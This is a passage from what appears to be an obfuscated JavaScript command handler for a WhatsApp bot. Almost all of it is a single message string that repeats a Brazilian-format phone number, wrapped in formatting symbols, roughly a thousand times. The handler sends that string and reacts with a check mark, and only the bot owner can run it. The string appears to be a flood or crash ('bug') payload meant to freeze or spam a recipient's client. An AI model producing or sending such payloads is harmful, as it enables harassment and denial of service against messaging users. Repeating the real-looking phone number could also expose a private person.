*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n'
        )
      }
      const _0xd77281 = {
        text: '\u2705',
        key: _0x27d5d2.key,
      }
      const _0x2656b8 = { react: _0xd77281 }
      await _0x53b98f.sendMessage(_0x4d8afb, _0x2656b8)
    } catch (_0xb67fc4) {
      _0x5938a4('*\uD83D\uDED1 This is an owner command...*')
      _0x538705(_0xb67fc4)
    }
  }
)
